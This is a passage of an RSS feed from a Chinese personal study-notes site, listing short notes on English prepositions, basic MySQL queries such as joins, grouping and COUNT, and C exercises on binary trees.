SELECT 查询列表 FROM 表一 别名 INNER JOIN 表二 别名 # SQL 92 用 WHERE，SQL99 用 ON ON 链接条件 WHERE SQL 92 内链接 SQL 92 只支持内链接，语法：
SELECT 查询列表 FROM 表一 别名,表二 别名 WHERE 链接条件 </description>
    </item>
    
    <item>
      <title>English across</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/across/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/across/</guid>
      <description>across 表示穿过/横穿 across + 物体的词语 表示在物体的表面穿过。经常与一些表示动作趋向的不及物动词搭配。
 We walk across the road. The children run across the street.  表示位置 across + 位置的词语 表示在&amp;hellip;对面
 My parents live across the street.  </description>
    </item>
    
    <item>
      <title>English into</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/into/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/into/</guid>
      <description>into 表示运动 动作趋势的不及物动词 + into 表示**&amp;hellip;进/进入&amp;hellip;**</description>
    </item>
    
    <item>
      <title>English outside</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/outside/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/outside/</guid>
      <description>outside 表示位置 outside + 位置或地点的词语 表示在某个地方的外面或外部。
 The temperature outside my house is ver low.  </description>
    </item>
    
    <item>
      <title>English with</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/with/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/with/</guid>
      <description>with 表示同伴 with +人或动物的词语 表示与&amp;hellip;一起。
 I go to the park with my daughter every day. I take the bus with her. She was with her friend last night.  表示具有/携带 with + 事物的词语
表示具有&amp;hellip;。
 The girl with big eyes and yellow hair is my daughter. I want to buy a house with a swimming pool. The boy with a book is my friend.  表示工具 with +具体工具的词语。
表示用&amp;hellip;/以&amp;hellip;。</description>
    </item>
    
    <item>
      <title>English within</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/within/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/within/</guid>
      <description>within 表示时间 within +一段时间的词语 表示在一段时间之内。
 We will be famous within five years. We will finsh our course within a month.  </description>
    </item>
    
    <item>
      <title>English without</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/without/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/without/</guid>
      <description>without 表示没有 without + 事物的词语 表示没有带某个物品 。强调本来应该带某物，但是因为疏忽或其他原因没有带就去做其他事情的情况
 He went out without his hat. He went to the restaurant without money.  without + 动名词/动名词短语 表示没有做某事，就去做另外一件事去了。
 She always attends my class without eating dinner.  表示条件 without + 某人/某物 表示如果没有，就&amp;hellip;
 without air, we could not live.  </description>
    </item>
    
    <item>
      <title>MySQL 等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>等值链接 判断不同表中都包含的字段是否相等，相等则显示，不等则过滤。且一般都用=来判断。
查询的是多张表的交集字段。
一般需要为表起别名。
注意
使用链接查询，很多时候容易出现Column &#39;字段名&#39; in ambiguousfield 错误，这种情况一般是因为不同的表中含有相同的字段名，导致系统无法知道我们到底要查询哪个表中的字段。这个时候只需要指定一下我们要查询的是哪个表中的字段即可。
查询女神名所对应的男神名 SELECT name,boyName FROM beauty,boys WHERE beauty.boyfriend_id = boys.id; 查询员工名所对应的部门名 SELECT last_name AS 员工名,department_name AS 部门名 FROM employees,departments WHERE employees.department_id = departments.department_id 查询员工名、工种号、工种名 链接查询通常比较长，因此我们可以给表定义一个别名。
注意，如果我们为一些表起了别名之后，后续的语句当中如果需要用到这些表，则只能用我们定义的别名，不能用原本的表名。
# 因为jobs 表和 employees 表中都用 job_id， # 系统不知道我们到底要查询哪一个， # 因此，这里需要指定一下我们要查询哪个表中的job_id SELECT last_name,员工表.job_id,job_title FROM employees AS 员工表, jobs AS 工种表 WHERE 员工表.job_id = 工种表.job_id; 查询城市名中第二个字符为 o 的部门和城市名 SELECT department_name,	city FROM departments AS 部门表,locations AS 位置表 WHERE 部门表.</description>
    </item>
    
    <item>
      <title>MySQL 自链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E8%87%AA%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E8%87%AA%E9%93%BE%E6%8E%A5/</guid>
      <description>自链接 判断同一张表中的不同字段是否相等，相等则显示，不相等则过滤。
需要给同一张表取不同的别名，让系统分清同一张表中的不同字段。
查询员工名所对应的领导名 SELECT 员工表.last_name AS 员工,领导表.last_name AS 领导 FROM employees AS 员工表, employees AS 领导表 WHERE 员工表.manager_id= 领导表.employee_id; </description>
    </item>
    
    <item>
      <title>MySQL 非等值链接</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</link>
      <pubDate>Wed, 27 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E5%86%85%E9%93%BE%E6%8E%A5/sql-92/%E9%9D%9E%E7%AD%89%E5%80%BC%E9%93%BE%E6%8E%A5/</guid>
      <description>非等值链接 新建查询并运行。
CREATE TABLE job_grades (grade_level VARCHAR(3),  lowest_sal int,  highest_sal int);  INSERT INTO job_grades VALUES (&amp;#39;A&amp;#39;, 1000, 2999);  INSERT INTO job_grades VALUES (&amp;#39;B&amp;#39;, 3000, 5999);  INSERT INTO job_grades VALUES(&amp;#39;C&amp;#39;, 6000, 9999);  INSERT INTO job_grades VALUES(&amp;#39;D&amp;#39;, 10000, 14999);  INSERT INTO job_grades VALUES(&amp;#39;E&amp;#39;, 15000, 24999);  INSERT INTO job_grades VALUES(&amp;#39;F&amp;#39;, 25000, 40000); 查询员工的工资和工资级别 SELECT salary,grade_level FROM employees AS 员工表, job_grades 工资等级表 WHERE 员工表.salary BETWEEN 工资等级表.lowest_sal AND 工资等级表.</description>
    </item>
    
    <item>
      <title>English around</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/around/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/around/</guid>
      <description>around 表示运动 around + 人或物的词语 表示围着&amp;hellip;环绕。
 The earth goes around the sun. We walk around the lake. The mouse ran around the room.  表示地点 around + 地点或位置的词语 表示在&amp;hellip;周围/附近。
 The man sells DVDs around the station. The children sat around the teacher. The banana trees are around the pond.  表示数量 around 修饰数词 表示大约&amp;hellip;。
 The number of listeners tonight is around 89.  </description>
    </item>
    
    <item>
      <title>English to</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/to/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/to/</guid>
      <description>to 表示方向 表示动作位移的词语 + to + 地方的词语 表示向某个地方移动。
 I will to Chongqing tomorrow. I walk to the park every morning.  表示时间/程度/结果 from&amp;hellip;to 表示从&amp;hellip;到&amp;hellip;。
 He works from morning to night. He will fly from the moon to the earth.  表示目的 to + 一些词语 表示为了&amp;hellip;
 We sat down to dinner.  表示比较 by + 数词 + to + 数词 表示几比几。
 We won the game by 5 to 3.</description>
    </item>
    
    <item>
      <title>English under</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/under/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/under/</guid>
      <description>under 表示位置 under + 位置的词语 表示在&amp;hellip;下方。强调的是垂直 90 度的下方。
 The are palying mahjong under the tree. The man under the bridge is Jeff.  表示年龄 under + 年龄/数量/重量的词语 表示不到&amp;hellip;/在&amp;hellip;以下。
 He is under ten years old.  表示过程 under + 某些词语 表示在&amp;hellip;过程中。
 The road is under repair.  </description>
    </item>
    
    <item>
      <title>English up</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/up/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/up/</guid>
      <description>up 表示运动方向 运动趋势的词语 +up + 位置或地点名词 表示向&amp;hellip;上/沿着&amp;hellip;。
 He ran up the hill. We went up the house.  表示位置 up + 位置的名词 表示在&amp;hellip;上面
 They live up the street. The cath fish up the river.  </description>
    </item>
    
    <item>
      <title>二叉树的最大深度</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%9C%80%E5%A4%A7%E6%B7%B1%E5%BA%A6/</guid>
      <description>二叉树的最大深度 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; typedef struct node {  int data;  struct node *lchild, *rchild; } n;  // 创建一个节点 node * get_a_node(int data) {  node *c = (node *)malloc(sizeof(node));  c-&amp;gt;data = data;  c-&amp;gt;lchild = 0;  c-&amp;gt;rchild = 0;  return c; }  //二叉树的最大深度 int max_depth(node *p) {  int left = 0;  int right = 0;  if (p-&amp;gt;lchild)  {  left = max_depth(p-&amp;gt;lchild);  }  if (p-&amp;gt;rchild)  {  right = max_depth(p-&amp;gt;rchild);  }  if (left &amp;gt; right)  return left + 1;  else  return right + 1; }  int main(void) {  // 构建树  node *t = get_a_node(1);  t-&amp;gt;lchild = get_a_node(2);  t-&amp;gt;rchild = get_a_node(3);  t-&amp;gt;lchild-&amp;gt;rchild = get_a_node(5);  t-&amp;gt;rchild-&amp;gt;rchild = get_a_node(7);  t-&amp;gt;rchild-&amp;gt;rchild-&amp;gt;lchild = get_a_node(14);   // 二叉树的最大深度  int depth = max_depth(t);  printf(&amp;#34;二叉树的深度为：%d\n&amp;#34;,depth);  return 0; } </description>
    </item>
    
    <item>
      <title>判断是否为完全二叉树</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
      <description>判断是否为完全二叉树 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; typedef struct node {  int data;  struct node *lchild, *rchild; } n;  //创建一个节点 node * get_a_node(int data) {  node *c = (node *)malloc(sizeof(node));  c-&amp;gt;data = data;  c-&amp;gt;lchild = 0;  c-&amp;gt;rchild = 0;  return c; }  /* //5 判断一棵树是否是完全二叉树，如果是返回1，如果否返回0 int is_complete(node *p){ //请完善这里 } */ int main(void) {  //构建一棵树  node *t = get_a_node(1);  t-&amp;gt;lchild = get_a_node(2);  t-&amp;gt;rchild = get_a_node(3);  t-&amp;gt;lchild-&amp;gt;rchild = get_a_node(5);  t-&amp;gt;rchild-&amp;gt;rchild = get_a_node(7);  t-&amp;gt;rchild-&amp;gt;rchild-&amp;gt;lchild = get_a_node(14);   return 0; } </description>
    </item>
    
    <item>
      <title>判断是否为对称二叉树</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BA%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
      <description>判断是否为对称二叉树 #include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt; typedef struct node {  int data;  struct node *lchild, *rchild; } n;  // 创建一个节点 node * get_a_node(int data) {  node *c = (node *)malloc(sizeof(node));  c-&amp;gt;data = data;  c-&amp;gt;lchild = 0;  c-&amp;gt;rchild = 0;  return c; }  bool isSymHeper(node* left,node* right); //3 判断是否是对称的二叉树，如果是返回1，如果否返回0 bool isSym(node* p) {  if(p == NULL)  return true;  return isSymHeper(p-&amp;gt;lchild,p-&amp;gt;rchild); } bool isSymHeper(node* left,node* right) {  if(left == NULL &amp;amp;&amp;amp; right == NULL)  return true;  if(left == NULL || right == NULL || left-&amp;gt;data !</description>
    </item>
    
    <item>
      <title>翻转二叉树</title>
      <link>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/</link>
      <pubDate>Tue, 26 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/datastructure/algorithm/tree/%E7%BF%BB%E8%BD%AC%E4%BA%8C%E5%8F%89%E6%A0%91/</guid>
      <description>翻转二叉树 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt;  typedef struct node {  int data;  struct node *lchild, *rchild; } n;  // 创建一个节点 node * get_a_node(int data) {  node *c = (node *)malloc(sizeof(node));  c-&amp;gt;data = data;  c-&amp;gt;lchild = 0;  c-&amp;gt;rchild = 0;  return c; }  //4 翻转二叉树，返回树根 node *node_reverse(node* p) {  if (p == NULL)  return NULL;  node_reverse(p-&amp;gt;lchild);  node_reverse(p-&amp;gt;rchild);  node * t = p-&amp;gt;lchild;  p-&amp;gt;lchild = p-&amp;gt;rchild;  p-&amp;gt;rchild = t;   return p; }  int main(void) {  //构建一棵树  node *t = get_a_node(1);  t-&amp;gt;lchild = get_a_node(2);  t-&amp;gt;rchild = get_a_node(3);  t-&amp;gt;lchild-&amp;gt;rchild = get_a_node(5);  t-&amp;gt;rchild-&amp;gt;rchild = get_a_node(7);  t-&amp;gt;rchild-&amp;gt;rchild-&amp;gt;lchild = get_a_node(14);    // 翻转二叉树  node* newt = node_reverse(t);  printf(&amp;#34;翻转后的二叉树根节点：%d\n&amp;#34;,newt-&amp;gt;lchild-&amp;gt;lchild-&amp;gt;rchild-&amp;gt;data );    return 0; } </description>
    </item>
    
    <item>
      <title>English near</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/near/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/near/</guid>
      <description>near 表示时间、空间 near + 地点或位置的词语 表示接近某个地方，对于 beside 和 by 来说，near 更加强调空间上的靠近或接近，而不是单一的在&amp;hellip;旁边。
另外 near 还表示相对的近。比如广西和广东，相对于中国来说，就他们离得很近，但是如果相对于人来说，依旧离得很远。
 You sit near me. I live near a river. The lake near my house is very big.  near + 具体时间点的词语 表示快要接近某个时间点了。
 It is near 2023. It is near 19:00. It is near spring festival.  </description>
    </item>
    
    <item>
      <title>English of</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/of/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/of/</guid>
      <description>of 表示&amp;hellip;的 of + 无生命的名词所有格/动名词短语/代词/数词 表示**&amp;hellip;的**
 The price of this coat. The color of my shirt.  of + 比较长的生命的名词 表示.&amp;hellip;的
 It is the story of my lady Mary, Queen of Scots. She is the daughter of my English teacher, Nick.  </description>
    </item>
    
    <item>
      <title>English off</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/off/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/off/</guid>
      <description>off 表示离开 固定搭配 off 作介词短时候，用法跟 from、out、of 很相似。
off 大多数情况都要跟一些特定的动词搭配，构成一个介词短语。
 Keep off the grass He fell the ladder She fell off the roof  </description>
    </item>
    
    <item>
      <title>English past</title>
      <link>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/past/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/subject/english/%E8%AF%8D%E7%B1%BB/%E4%BB%8B%E8%AF%8D/%E4%BB%8B%E8%AF%8D%E8%AF%A6%E8%A7%A3/past/</guid>
      <description>past 表示时间 数词（几分钟） + past + 几点钟 表示几点过了几分钟，而且，只能表示半小时以及半小时之内的时间。
 30 past 7 = 7:30 = half past 7（表示 7 点过了 30 分钟）  但这种结构，不能作介词短语，因为它仅仅只是一个表示时间的数词。想要作时间状语造句，必须跟其他介词构成介词短语。
 I begin my class at 25 past 7.  有时候 past 构成的数词也可以直接作表语。
It is + 数词 + past +几点 表示现在是几点钟。
 It is 20 past 8. It is half past ten  表示超过 past + 数量或年龄的词语 表示超过某个年龄或超过某个数量。
 He is past sixty year old.  </description>
    </item>
    
    <item>
      <title>MySQL COUNT</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/count/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%88%86%E7%BB%84%E5%87%BD%E6%95%B0/count/</guid>
      <description>COUNT COUNT(*) 统计表的行数，在统计结果的时候，不会忽略字段值为 NULL 的行。
这种写法用的比较多，因为在一般的存储引擎下，COUNT(*)的效率通常比较高。
COUNT(1) 忽略所有字段，1 表示一个固定值，也可以用 COUNT(2)、COUNT(3) 代替，在统计结果的时候，不会忽略字段值为 NULL 的行。
COUNT(字段名) 统计指定字段名的值有多少行，字段值为 NULL 的行会被忽略统计。
COUNT(DISTINCT 字段名) 统计指定字段名的值有多少行，，字段值为 NULL 或重复的行会被忽略统计。</description>
    </item>
    
    <item>
      <title>MySQL 分组查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2/</guid>
      <description>分组查询 通过一定的规则将一个数据集划分为若干个小组，然后对这些小组中的数据进行处理。
语法 SELECT 字段名 FROM 表名 WHERE 分组前的筛选条件 GROUP BY 依照哪个字段进行分组 ORDER BY 排序列表 HAVING 分组后的筛选条件 查询列表必须特殊，必须实分组函数和 GROUP BY后面出现的字段。
分组查询的筛选条件被分为分组前的筛选和分组后的筛选
WHERE 和 HAVING WHERE，分组之前的筛选条件，数据来源是原始表。
HAVING，分组之后的筛选条件，数据来源是经过 WHERE 筛选后的表。
用先用 WHERE 来进行筛选的，优先考虑先用 WHERE 来进行筛选。
按单个字段分组 查询每个工种的最高工资 SELECT MAX(salary),job_id FROM employees GROUP BY job_id 查询每个部门，邮箱中包含 a 字符的平均工资 SELECT AVG(salary), department_id FROM employees WHERE email LIKE &amp;#39;%a%&amp;#39; GROUP BY department_id 查询每个领导手下有奖金的员工的最高工资 SELECT MAX(salary),manager_id FROM employees WHERE commission_pct IS NOT NULL GROUP BY manager_id 查询哪些部门的员工数 &amp;gt; 2 SELECT COUNT(*) AS 员工个数, department_id FROM employees GROUP BY department_id HAVING 员工个数 &amp;gt;2; 查询哪些工种编号的最高工资 &amp;gt; 12000 SELECT MAX(salary) AS 最高工资, job_id FROM employees WHERE commission_pct IS NOT NULL GROUP BY job_id HAVING 最高工资 &amp;gt;12000; 查询哪些领导编号 &amp;gt;102 ，且最低工资 &amp;gt; 5000 SELECT MIN(salary) AS 最低工资,manager_id FROM employees WHERE manager_id &amp;gt; 102 GROUP BY manager_id HAVING 最低工资 &amp;gt; 5000; 按表达式或函数分组 按员工姓的长度分组，查询每组员工个数 &amp;gt;5 的组 SELECT COUNT(*) AS 员工个数,LENGTH(last_name) AS 这些员工的姓名长度 FROM employees GROUP BY LENGTH(last_name) HAVING 员工个数 &amp;gt; 5 按多个字段分组 将GROUP BY后面的多个字段用,隔开即可。</description>
    </item>
    
    <item>
      <title>MySQL 链接查询</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/</link>
      <pubDate>Mon, 25 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dql/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/%E9%93%BE%E6%8E%A5%E6%9F%A5%E8%AF%A2/</guid>
      <description>链接查询 当需要从多张表中查询数据，而这些表之间有关联字段的时候，需要使用连接查询。</description>
    </item>
    
    <item>
      <title>MySQL CREATE</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/ddl/create/</link>
      <pubDate>Sun, 24 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/ddl/create/</guid>
      <description>创建表 mysql&amp;gt; create table rainy(  -&amp;gt; id int,  -&amp;gt; name varchar(20)); Query OK, 0 rows affected (0.01 sec) </description>
    </item>
    
    <item>
      <title>MySQL 其他函数</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 24 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/%E5%87%BD%E6%95%B0/%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0/%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0/</guid>
      <description>其他函数 查询 MySQL 版本号 SELECT VERSION(); 查询当前处于哪个数据库 SELECT DATABASE(); 查询当前用户 SELECT USER() </description>
    </item>
    
    <item>
      <title>MySQL INSERT</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/dml/insert/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/dml/insert/</guid>
      <description>INSERT 用于向数据库中的表插入数据。
插入数据 使用insert into TableName;来插入一些数据，TableName 是要插入数据的表的名称。
mysql&amp;gt; insert into rainy (id,name) values(1,&amp;#39;su&amp;#39;); Query OK, 1 row affected (0.00 sec) 我们插入数据后重新查询表中的数据：
mysql&amp;gt; select * from rainy; +------+------+ | id | name | +------+------+ | 1 | su | | 1 | su | +------+------+ 2 rows in set (0.00 sec) </description>
    </item>
    
    <item>
      <title>MySQL SHOW</title>
      <link>https://note.yxzi.xyz/note/technology/mysql/show/</link>
      <pubDate>Sat, 23 Apr 2022 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/mysql/show/</guid>
      <description>SHOW SHOW ENGINES 查看 MySQL 支持的存储引擎。
